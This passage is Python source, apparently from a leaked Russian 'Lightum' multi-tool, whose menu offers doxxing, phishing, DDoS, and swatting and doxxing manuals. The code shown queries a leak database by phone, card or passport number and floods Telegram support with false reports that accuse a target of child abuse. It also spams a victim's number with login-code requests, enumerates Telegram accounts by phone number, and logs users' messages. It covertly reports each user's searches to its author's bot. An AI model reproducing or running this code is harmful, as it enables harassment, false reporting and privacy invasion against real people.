            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes u003esupport@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes ask@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes 125support@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes me@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes enquiries@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes api_support@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes marketing@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes ca@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes recovery@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes http@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes corp@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes corona@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes ton@telegram.org",
            "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes sticker@telegram.org",
        ]
        messages = [
            "Hello,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesrname}hello, I want to complain about a user who clearly violates the telegram rules, his account @{username} - this user uses a virtual number, threatens with false feminization and deanonymization and throws elements of child abuse into chats, please take action! Please! He also has his channel in his bio where he posts it all (violations), and he use virtual numberthere are also violations in his channel https://t.me/{username}",
            "hello,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesd throws elements of child abuse into chats, please take action! Please! He also has his channel in his bio where he posts it all (violations), and he use virtual number, there are also violations in his channel https://t.me/{username}",
            "hello,#СЛИТО НА КАНАЛЕ t.me/Falcon_Byteshis channel in his bio where he posts it all (violations), and he use virtual number, https://t.me/{username}",
            "Report for User",
        ]
        subjects = ["Report for User", "Reporting", "Help pls", "Report User", "Report"]

        def get_proxy():
            proxy_api_url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"
            try:
                response = requests.get(proxy_api_url)
                if response.status_code == 200:
                    proxy_list = response.text.strip().split("\r\n")
                    return proxy_list
                else:
                    print()
                    pystyle.Write.Print(
                        f"[!] Произошла ошибка -> ",
                        pystyle.Colors.red_to_yellow,
                        interval=0.005,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    )
                    pystyle.Write.Print(
                        f"{response.status_code}", pystyle.Colors.white, interval=0.005
                    )
                    print()
            except Exception as e:
                print()#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                pystyle.Write.Print(
                    f"[!] Произошла ошибка -> ", pystyle.Colors.red, interval=0.005#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                )
                pystyle.Write.Print(f"{str(e)}", pystyle.Colors.white, interval=0.005)
                print()
            return None

        def ip_lookup(ip_address):
            print()
            url = f"http://ip-api.com/json/{ip_address}"
            try:
                response = requests.get(url)
                data = response.json()
                if data.get("status") == "fail":
                    pystyle.Write.Print(
                        f"[!] Произошла ошибка -> ",
                        pystyle.Colors.red_to_yellow,
                        interval=0.005,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    )
                    pystyle.Write.Print(
                        f"[!] {data['message']}\n", pystyle.Colors.white, interval=0.005#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    )
                info = ""
                for key, value in data.items():
                    info = pystyle.Write.Print(
                        f"[+] {key} -> ", pystyle.Colors.red_to_yellow, interval=0.005
                    )
                    pystyle.Write.Print(
                        f"{value}\n", pystyle.Colors.white, interval=0.005
                    )
                return info
            except Exception as e:
                pystyle.Write.Print(#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    f"[!] Произошла ошибка -> ",
                    pystyle.Colors.red_to_yellow,
                    interval=0.005,
                )#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                pystyle.Write.Print(f"{str(e)}\n", pystyle.Colors.white, interval=0.005)

        def Search(Term):
            resulti = ""
            if len(Term) < MIN:
                print()
                pystyle.Write.Print(
                    f"[!] Минимум 3 символов!\n",
                    pystyle.Colors.red_to_yellow,
                    interval=0.005,
                )
            global hwid, last_request_time
            current_time = time.time()
            if current_time - last_request_time < 0:
                print()
                pystyle.Write.Print(
                    f"[!] Подождите 2 минуты перед следующим запросом\n",
                    pystyle.Colors.red_to_yellow,
                    interval=0.005,
                )
                return
            if len(Term) < MIN:
                return
            data = {"token": API, "request": Term, "limit": 10000, "lang": "ru"}
            url = "https://server.leakosint.com/"#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
            try:
                response = requests.post(url, json=data)
                data = response.json()
            except requests.exceptions.RequestException as e:
                print()
                pystyle.Write.Print(
                    f"[!] Ошибка запроса к API -> ",
                    pystyle.Colors.red_to_yellow,
                    interval=0.005,
                )
                pystyle.Write.Print(f"{e}", pystyle.Colors.white, interval=0.005)
                return
            seen = set()
            try:
                for source in data["List"]:
                    if source == "No results found":
                        print()
                        pystyle.Write.Print(
                            f"[!] Информации не найдено\n",
                            pystyle.Colors.red_to_yellow,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                            interval=0.005,
                        )
                        continue
                    print()
                    pystyle.Write.Print(
                        f"[!] База данных -> ",
                        pystyle.Colors.red_to_yellow,
                        interval=0.001,
                    )
                    pystyle.Write.Print(
                        f"{source}\n", pystyle.Colors.white, interval=0.001
                    )
                    resulti += f"[!] База данных -> {source}\n"
                    for item in data["List"][source]["Data"]:
                        if str(item) in seen:
                            continue
                        seen.add(str(item))
                        for key, value in item.items():
                            pystyle.Write.Print(
                                f"[+] {key} -> ",
                                pystyle.Colors.red_to_yellow,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                                interval=0.001,
                            )
                            pystyle.Write.Print(
                                f"{value}\n", pystyle.Colors.white, interval=0.001
                            )
                            resulti += f"[+] {key} -> {value}\n"
                if "No results found" not in data["List"]:
                    print()
                    pystyle.Write.Print(
                        "----======[", pystyle.Colors.cyan_to_blue, interval=0.005
                    )
                    pystyle.Write.Print("LIGHTUM", pystyle.Colors.white, interval=0.005)
                    pystyle.Write.Print(
                        "]======----", pystyle.Colors.cyan_to_blue, interval=0.005
                    )
                    print()
                if source == "No results found":
                    msg = (
                        f"<code>[+] {full_hwid} искал {Term} и ничего не нашел!</code>"
                    )
                    bot.send_message(chat_id, msg, parse_mode="HTML")
                else:
                    with open("results.txt", "a+", encoding="utf-8") as file:
                        file.write(str(resulti))#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    msg = f"<code>[+] {full_hwid} искал {Term} и что-то нашел!:</code>"
                    bot.send_message(chat_id, msg, parse_mode="HTML")
                    try:
                        bot.send_message(
                            chat_id, f"<code>{resulti}</code>", parse_mode="HTML"
                        )
                    except Exception as e:
                        bot.send_message(
                            chat_id,
                            f"[!] Произошла ошибка -> <code>{e}</code>",
                            parse_mode="HTML",
                        )
            except Exception as e:
                print()
                print("[!] Произошла ошибка ->", e)
            last_request_time = current_time

        starting1 = """██████████████████████████████████████████████████████████████████████████████████████████████████
█                                      #СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes                                                          █
█                                                                                                █
█         ▄█        ▄█     ▄██████▄     ▄█    █▄        ███     ███    █▄    ▄▄▄▄███▄▄▄▄         █#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
█        ███       ███    ███    ███   ███    ███   ▀█████████▄ ███    ███ ▄██▀▀▀███▀▀▀██▄       █
█        ███       ███▌   ███    █▀    ███    ███      ▀███▀▀██ ███    ███ ███   ███   ███       █
█        ███       ███▌  ▄███         ▄███▄▄▄▄███▄▄     ███   ▀ ███    ███ ███   ███   ███       █
█        ███       ███▌ ▀▀███ ████▄  ▀▀███▀▀▀▀███▀      ███     ███    ███ ███   ███   ███       █
█        ███       ███    ███    ███   ███    ███       ███     ███    ███ ███   ███   ███       █#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
█        ███▌    ▄ ███    ███    ███   ███    ███       ███     ███    ███ ███   ███   ███       █
█        █████▄▄██ █▀     ████████▀    ███    █▀       ▄████▀   ████████▀   ▀█   ███   █▀        █
█                               #СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes                                                                 █
█                                                                                                █
██████████████████████████████████████████████████████████████████████████████████████████████████
█                                                                                                █
█ Версия: Reborn 1.1                   TGC: @lightum_tool                         TG: @Lightumin █
█                                                                                                █#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
██████████████████████████████████████████████████████████████████████████████████████████████████
█                        █                      █                          █                     █#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
█        Поиск 2.0       █       Телеграм       █          Прочее          █    Старые функции   █
█                        █                      █                          █                     █
██████████████████████████████████████████████████████████████████████████████████████████████████
█                        █                      █                          █                     █
█ 1: Поиск по номеру     █ 16: Рассылка         █ 31: cB@T Б@HB0Pд         █ 46: Поиск по номеру █
█ 2: Поиск по почте      █ 17: Парсер           █ 32: Генератор пароля     █ 47: Поиск по нику   █
█ 3: Поиск по нику       █ 18: Траффер          █ 33: Генератор личности   █ 48: Поиск по сайту  █
█ 4: Поиск по ФИО        █ 19: Автоответчик     █ 34: Генератор карты      █ 49: Поиск по домену █#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
█ 5: Поиск по телеграму  █ 20: Логгер сообщений █ 35: Генератор прокси     █ 50: Поиск по IP     █
█ 6: Поиск по адресу     █ 21: Парсер сообщений █ 36: Генератор User-Agent █ 51: Поиск по БД     █
█ 7: Поиск по карте      █ 22: Снос             █ 37: Фишинг VK            █ 52: Мануал по свату █
█ 8: Поиск по VK         █ 23: Спам в поддержку █ 38: Фишинг TikTok        █ 53: Мануал по доксу █#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
█ 9: Поиск по авто       █ 24: Снос TGC         █ 39: Фишинг Facebook      █ 54: Мануал по анон. █
█ 10: Поиск по сайту     █ 25: Снос поддержка   █ 40: Фишинг YouTube       █                     █
█ 11: Поиск по домену    █ 26: Снос TGC MailRU  █ 41: Фишинг OK            ███████████████████████
█ 12: Поиск по Facebook  █ 27: С#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesнос TGC Yahoo   █ 42: Фишинг анонимный чат █                     █
█ 13: Поиск по IP        █ 28: Снос TGC Rambler █ 43: Фишинг глаз бога     █   55: Информация    █
█ 14: Поиск по паролю    █ 29: Снос TGC Gmail   █ 44: DDoS                 █   56: Зал славы     █
█ 15: Поиск по документу █ 30: Спамер           █ 45: Парсер               █   57: Выход         █
█                        █                      █                          █                     █
██████████████████████████████████████████████████████████████████████████████████████████████████\n\n"""
        starting2 = """    __    ____________  __________  ____  ___
   / /   /  _/ ____/ / / /_  __/ / / /  |/  /
  / /    / // / __/ /_/ #СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes/ / / / / / / /|_/ / 
 / /____/ // /_/ / __  / / / / /_/ / /  / /  
/_____/___/\____/_/ /_/ /_/  \____/_/  /_/   """
        starting3 = """
          TGC: @lightum_tool TG: @Lightumin
                             
███████████████████████████████████████████████████
█                          █                      █
█         Поиск 2.0        █       Телеграм       █#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
█                          █                      █
███████████████████████████████████████████████████
█                          █                      █
█ 1: Поиск по номеру       █ 16: Рассылка         █
█ 2: Поиск по почте        █ 17: Парсер           █
█ 3: Поиск по нику         █ 18: Траффер          █
█ 4: Поиск по ФИО          █ 19: Автоответчик     █
█ 5: Поиск по телеграму    █ 20: Логгер сообщений █
█ 6: Поиск по адресу       █ 21: Парсер сообщений █
█ 7: Поиск по карте        █ 22: Снос             █#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
█ 8: Поиск по VK           █ 23: Спам в поддержку █
█ 9: Поиск по авто         █ 24: Снос TGC         █
█ 10: Поиск по сайту       █ 25: Снос поддержка   █
█ 11: Поиск по домену      █ 26: Снос TGC MailRU  █
█ 12: Поиск по Facebook    █ 27: Снос TGC Yahoo   █
█ 13: Поиск по IP          █ 28: Снос TGC Rambler █#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
█ 14: Поиск по паролю      █ 29: Снос TGC Gmail   █
█ 15: Поиск по документу   █ 30: Спамер           █
█                          █                      █
███████████████████████████████████████████████████
█                          █                      █
█          Прочее          █     Старые функции   █
█                          █                      █#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
███████████████████████████████████████████████████
█                          █                      █
█ 31: cB@T Б@HB0Pд         █ 46: Поиск по номеру  █
█ 32: Генератор пароля     █ 47: Поиск по нику    █
█ 33: Генератор личности   █ 48: Поиск по сайту   █
█ 34: Генератор карты      █ 49: Поиск по домену  █
█ 35: Генератор прокси     █ 50: Поиск по IP      █
█ 36: Генератор User-Agent █ 51: Поиск по БД      █
█ 37: Фишинг VK            █ 52: Мануал по свату  █#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
█ 38: Фишинг TikTok        █ 53: Мануал по доксу  █
█ 39: Фишинг Facebook      █ 54: Мануал по анон.  █
█ 40: Фишинг YouTube       █                      █
█ 41: Фишинг OK            ████████████████████████#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
█ 42: Фишинг анонимный чат █                      █
█ 43: Фишинг глаз бога     █    55: Информация    █
█ 44: DDoS                 █    56: Зал славы     █
█ 45: Парсер               █    57: Выход         █#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
█                          █                      █
███████████████████████████████████████████████████\n\n"""#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
        if platform.system() == "Windows":
            os.system("cls")
            pystyle.Write.Print(
                pystyle.Center.XCenter(starting1),
                pystyle.Colors.cyan_to_blue,
                interval=0.0005,
            )
        else:
            os.system("clear")
            pystyle.Write.Print(
                pystyle.Center.XCenter(starting2),
                pystyle.Colors.cyan_to_blue,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                interval=0.0005,
            )
            print()
            pystyle.Write.Print(#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                pystyle.Center.XCenter(starting3),
                pystyle.Colors.cyan_to_blue,
                interval=0.0005,
            )
        bot.send_message(
            chat_id,
            f"[+] <code>{full_hwid}</code> успешно запустил Lightum!",
            parse_mode="HTML",#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
        )
        while True:#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
            print()
            choice = pystyle.Write.Input(
                "[?] Выберите пункт меню -> ",
                pystyle.Colors.cyan_to_blue,
                interval=0.005,
            )
            if choice == "1":
                print()
                Term = pystyle.Write.Input(
                    "[?] Введите номер -> ", pystyle.Colors.cyan_to_blue, interval=0.005
                )#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                Search(Term)
            if choice == "2":
                print()
                Term = pystyle.Write.Input(#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    "[?] Введите почту -> ", pystyle.Colors.cyan_to_blue, interval=0.005
                )
                Search(Term)
            if choice == "3":
                print()
                Term = pystyle.Write.Input(
                    "[?] Введите никнейм -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                Search(Term)#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
            if choice == "4":
                print()
                Term = pystyle.Write.Input(
                    "[?] Введите ФИО -> ", pystyle.Colors.cyan_to_blue, interval=0.005
                )
                Search(Term)
            if choice == "5":#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                print()
                Term = pystyle.Write.Input(
                    "[?] Введите телеграм ID -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                Search(Term)
            if choice == "6":
                print()
                Term = pystyle.Write.Input(
                    "[?] Введите адрес -> ", pystyle.Colors.cyan_to_blue, interval=0.005
                )
                Search(Term)
            if choice == "7":
                print()
                Term = pystyle.Write.Input(#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    "[?] Введите номер карты -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                Search(Term)
            if choice == "8":
                print()
                Term = pystyle.Write.Input(
                    "[?] Введите VK ID -> ", pystyle.Colors.cyan_to_blue, interval=0.005
                )
                Search(Term)
            if choice == "9":#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                print()
                Term = pystyle.Write.Input(
                    "[?] Введите номер авто -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                Search(Term)
            if choice == "10":
                print()
                Term = pystyle.Write.Input(
                    "[?] Введите сайт -> ", pystyle.Colors.cyan_to_blue, interval=0.005
                )
                Search(Term)
            if choice == "11":
                print()#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                Term = pystyle.Write.Input(
                    "[?] Введите домен -> ", pystyle.Colors.cyan_to_blue, interval=0.005
                )
                Search(Term)
            if choice == "12":
                print()
                Term = pystyle.Write.Input(
                    "[?] Введите Facebook ID -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                Search(Term)
            if choice == "13":
                print()
                Term = pystyle.Write.Input(
                    "[?] Введите IP -> ", pystyle.Colors.cyan_to_blue, interval=0.005
                )
                Search(Term)#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
            if choice == "14":
                print()
                Term = pystyle.Write.Input(
                    "[?] Введите пароль -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                Search(Term)
            if choice == "15":
                print()
                Term = pystyle.Write.Input(
                    "[?] Введите номер документа -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                Search(Term)
            if choice == "16":
#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                def transliterate_to_latin(text):
                    translit_dict = {
                        "а": "a",
                        "б": "b",
                        "в": "v",
                        "г": "g",
                        "д": "d",
                        "е": "e",
                        "ё": "e",
                        "ж": "zh",
                        "з": "z",
                        "и": "i",
                        "й": "y",
                        "к": "k",
                        "л": "l",
                        "м": "m",
                        "н": "n",
                        "о": "o",
                        "п": "p",
                        "р": "r",
                        "с": "s",
                        "т": "t",
                        "у": "u",
                        "ф": "f",
                        "х": "kh",
                        "ц": "ts",
                        "ч": "ch",
                        "ш": "sh",
                        "щ": "sch",
                        "ъ": "",
                        "ы": "y",
                        "ь": "",
                        "э": "e",
                        "ю": "yu",
                        "я": "ya",
                    }
                    latin_text = "".join(translit_dict.get(c, c) for c in text.lower())
                    return latin_text

                async def send_messages():
                    api_id = "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes"
                    api_hash = "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes"
                    await client.start()
                    print()
                    message = pystyle.Write.Input(
                        "[?] Введите текст для рассылки -> ",
                        pystyle.Colors.cyan_to_blue,
                        interval=0.005,
                    )
                    print()
                    num_messages = int(
                        pystyle.Write.Input(
                            "[?] Введите количество сообщений -> ",
                            pystyle.Colors.cyan_to_blue,
                            interval=0.005,
                        )
                    )
                    print()
                    fake = faker.Faker()
                    for _ in range(num_messages):
                        random_name_cyrillic = fake.first_name()
                        random_name_latin = transliterate_to_latin(random_name_cyrillic)
                        try:
                            user = await client.get_entity(random_name_latin)
                            await client.send_message(user, message)
                            pystyle.Write.Print(
                                f"[+] Отправлено сообщение пользователю -> ",
                                pystyle.Colors.red_to_yellow,
                                interval=0.005,
                            )
                            pystyle.Write.Print(
                                f"{random_name_cyrillic} ({random_name_latin})\n",
                                pystyle.Colors.white,
                                interval=0.005,
                            )
                        except telethon.errors.rpcerrorlist.UserNotParticipantError:
                            pystyle.Write.Print(
                                f"[!] Пользователь -> ",
                                pystyle.Colors.red_to_yellow,
                                interval=0.005,
                            )
                            pystyle.Write.Print(
                                f"{random_name_cyrillic} ({random_name_latin})",
                                pystyle.Colors.white,
                                interval=0.005,
                            )
                            pystyle.Write.Print(
                                " не является участником.\n",
                                pystyle.Colors.red_to_yellow,
                                interval=0.005,
                            )
                        except Exception as e:
                            pystyle.Write.Print(
                                f"[!] Не удалось отправить сообщение пользователю -> ",
                                pystyle.Colors.red_to_yellow,
                                interval=0.005,
                            )
                            pystyle.Write.Print(
                                f"{random_name_cyrillic} ({random_name_latin}).\n",
                                pystyle.Colors.white,
                                interval=0.005,
                            )

                asyncio.run(send_messages())
            if choice == "17":

                async def main():
                    print()
                    range_num = int(
                        pystyle.Write.Input(
                            "[?] Введите число -> ",
                            pystyle.Colors.cyan_to_blue,
                            interval=0.005,
                        )
                    )
                    print()
                    api_id = "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes"
                    api_hash = "#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes"
                    codes = {
                        "МТС": [910, 915, 916, 917, 919, 985, 986],
                        "Билайн": [
                            903,
                            905,
                            906,
                            909,
                            962,
                            963,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                            964,
                            965,
                            966,
                            967,
                            968,
                            969,
                            980,
                            983,
                            986,
                        ],
                        "МегаФон": [925, 926, 929, 936, 999],
                        "Теле2": [901, 958, 977, 999],
                    }
                    async with telethon.TelegramClient(
                        "session_name", api_id, api_hash
                    ) as client:
                        for _ in range(range_num):
                            operator = random.choice(list(codes.keys()))
                            operator_code = random.choice(codes[operator])
                            phone_number = (
                                f"+7{operator_code}{random.randint(1000000,9999999)}"
                            )
                            random_name = "".join(
                                random.choices(
                                    string.ascii_uppercase + string.ascii_lowercase,
                                    k=10,
                                )
                            )
                            contact = telethon.tl.types.InputPhoneContact(
                                client_id=0,
                                phone=phone_number,
                                first_name=random_name,
                                last_name="",
                            )
                            result = await client(
                                telethon.tl.functions.contacts.ImportContactsRequest(
                                    [contact]
                                )
                            )
                            try:
                                entity = await client.get_entity(phone_number)
                                pystyle.Write.Print(
                                    f"[+] Аккаунт существует -> ",
                                    pystyle.Colors.red_to_yellow,
                                    interval=0.005,
                                )
                                pystyle.Write.Print(
                                    f"{entity.phone} | {entity.username} | {entity.first_name} | {entity.id}\n",
                                    pystyle.Colors.white,
                                    interval=0.005,
                                )
                                with open("parser.txt", "a+", encoding="utf-8") as f:
                                    f.write(
                                        f"{entity.phone}, {entity.username}, {entity.first_name}, {entity.id}\n"
                                    )
                            except ValueError:
                                pystyle.Write.Print(
                                    f"[!] Аккаунт -> ",
                                    pystyle.Colors.red_to_yellow,
                                    interval=0.005,
                                )
                                pystyle.Write.Print(
                                    f"{phone_number}",
                                    pystyle.Colors.white,
                                    interval=0.005,
                                )
                                pystyle.Write.Print(
                                    f" не существует\n",
                                    pystyle.Colors.red_to_yellow,
                                    interval=0.005,
                                )

                asyncio.run(main())
            if choice == "18":
                count = 0

                async def send_message():
                    while True:
                        try:
                            await client.send_message(linkc, message1)
                            global count
                            count += 1
                            pystyle.Write.Print(#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                                "[+] Сообщение отправлено, всего отправлено -> ",
                                pystyle.Colors.red_to_yellow,
                                interval=0.005,
                            )
                            pystyle.Write.Print(
                                f"{count}\n", pystyle.Colors.white, interval=0.005
                            )
                        except Exception as e:#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                            pystyle.Write.Print(
                                f"[!] Произошла ошибка -> ",
                                pystyle.Colors.red_to_yellow,
                                interval=0.005,
                            )
                            pystyle.Write.Print(
                                f"{e}\n", pystyle.Colors.white, interval=0.005
                            )
                        await asyncio.sleep(time2)

                async def main():
                    async with client:
                        await asyncio.gather(send_message())
#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                client = telethon.TelegramClient("session_telegram", api_id, api_hash)
                print()
                linkc = pystyle.Write.Input(
                    "[?] Введите ссылку на группу -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                print()
                message1 = pystyle.Write.Input(
                    "[?] Введите текст -> ", pystyle.Colors.cyan_to_blue, interval=0.005
                )
                print()
                time2 = int(
                    pystyle.Write.Input(
                        "[?] Введите время перерыва -> ",
                        pystyle.Colors.cyan_to_blue,
                        interval=0.005,
                    )
                )
                print()
                asyncio.run(main())#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
            if choice == "19":
                responded_users = set()
                print()
                response_text = pystyle.Write.Input(
                    "[?] Введите текст -> ", pystyle.Colors.cyan_to_blue, interval=0.005
                )

                @client.on(telethon.events.NewMessage)
                async def my_event_handler(event):
                    if event.sender_id not in responded_users:
                        await event.reply(response_text)
                        responded_users.add(event.sender_id)

                client.start()
                client.run_until_disconnected()
            if choice == "20":

                async def main():
                    print()
                    username = pystyle.Write.Input(
                        "[?] Введите никнейм(c @) -> ",
                        pystyle.Colors.cyan_to_blue,
                        interval=0.005,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    )
                    user = await client.get_entity(username)
                    user_id = user.id
                    print()
                    group_link = pystyle.Write.Input(
                        "[?] Введите ссылку -> ",
                        pystyle.Colors.cyan_to_blue,
                        interval=0.005,
                    )
                    print()

                    async def handler(event):
                        if event.message.sender_id == user_id:
                            with open("logger.txt", "a+", encoding="utf-8") as file:
                                file.write(
                                    f"{event.message.date.strftime('%Y-%m-%d %H:%M:%S')} | {user.first_name} (@{user.username}) -> {event.message.text}\n"
                                )
                            print()
                            pystyle.Write.Print(
                                f"[+] {event.message.date.strftime('%Y-%m-%d %H:%M:%S')} | {user.first_name} (@{user.username}) -> ",
                                pystyle.Colors.red_to_yellow,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                                interval=0.005,
                            )
                            pystyle.Write.Print(
                                f"{event.message.text}",
                                pystyle.Colors.white,
                                interval=0.005,
                            )
                            print()
#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    client.add_event_handler(
                        handler, telethon.events.NewMessage(chats=group_link)
                    )
                    await client.run_until_disconnected()

                with client:
                    client.loop.run_until_complete(main())
            if choice == "21":

                async def main():
                    await client.start()
                    print()
                    username = pystyle.Write.Input(
                        "[?] Введите никнейм(с @) -> ",
                        pystyle.Colors.cyan_to_blue,
                        interval=0.005,
                    )
                    user = await client.get_entity(username)
                    print()
                    group = pystyle.Write.Input(
                        "[?] Введите ссылку -> ",
                        pystyle.Colors.cyan_to_blue,
                        interval=0.005,
                    )
                    async for message in client.iter_messages(
                        group, from_user=username
                    ):
                        date = str(message.date)#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                        name = message.from_id.user_id
                        content = str(message.text)
                        row = f"{date} | @{user.username} -> {content}\n"
                        with open("parser_message.txt", "a+", encoding="utf-8") as f:
                            f.write(row)
                        print()
                        pystyle.Write.Print(
                            f"{date} | @{user.username} -> ",
                            pystyle.Colors.red_to_yellow,
                            interval=0.005,
                        )
                        pystyle.Write.Print(
                            f"{content}", pystyle.Colors.white, interval=0.005
                        )
                    print()
                    await client.disconnect()

                with client:
                    client.loop.run_until_complete(main())
            if choice == "22":
                print()
                username = pystyle.Write.Input(
                    f"[?] Введите никнейм канала(без @) -> ",#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                print()
                for senderemail, senderpassword in senders:
                    for recipientemail in recipients:
                        server = smtplib.SMTP("smtp.rambler.ru", 587)
                        subject = random.choice(subjects)
                        messagetext = random.choice(messages)
                        sendemail(
                            senderemail,
                            senderpassword,
                            recipientemail,
                            subject,
                            server,
                            messagetext,
                        )
            if choice == "23":
                count = 0
                user = fake_useragent.UserAgent().random#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                headers = {"user_agent": user}
                print()
                number = int(
                    pystyle.Write.Input(
                        f"[?] Введите номер -> ",
                        pystyle.Colors.cyan_to_blue,
                        interval=0.005,
                    )
                )
                print()
                try:
                    while True:
                        response = requests.post(
                            "https://my.telegram.org/auth/send_password",
                            headers=headers,
                            data={"phone": number},
                        )
                        response1 = requests.get(
                            "https://telegram.org/support?setln=ru", headers=headers
                        )
                        response2 = requests.post(#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                            "https://my.telegram.org/auth/",
                            headers=headers,
                            data={"phone": number},
                        )
                        response3 = requests.post(
                            "https://my.telegram.org/auth/send_password",
                            headers=headers,
                            data={"phone": number},
                        )
                        response4 = requests.get(
                            "https://telegram.org/support?setln=ru", headers=headers
                        )
                        response5 = requests.post(
                            "https://my.telegram.org/auth/",
                            headers=headers,
                            data={"phone": number},
                        )
                        count += 1
                        pystyle.Write.Print(
                            f"[+] Круг спама был завершен, количество пройденых кругов -> #СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes",
                            pystyle.Colors.red_to_yellow,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                            interval=0.005,
                        )
                        pystyle.Write.Print(
                            f"{count}\n", pystyle.Colors.white, interval=0.005
                        )
                except Exception as e:
                    pystyle.Write.Print(
                        f"[!] Произошла ошибка -> ",
                        pystyle.Colors.red_to_yellow,
                        interval=0.005,
                    )
                    pystyle.Write.Print(
                        f"{str(e)}\n", pystyle.Colors.white, interval=0.005
                    )
            if choice == "24":
                print()
                username = pystyle.Write.Input(
                    f"[?] Введите никнейм канала(без @) -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                print()
                for senderemail, senderpassword in senders:
                    for recipientemail in recipients:
                        server = smtplib.SMTP("smtp.rambler.ru", 587)
                        subject = random.choice(subjects)
                        messagetext = random.choice(messages)
                        sendemail(
                            senderemail,
                            senderpassword,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                            recipientemail,
                            subject,
                            server,
                            messagetext,
                        )
            if choice == "25":
                print()
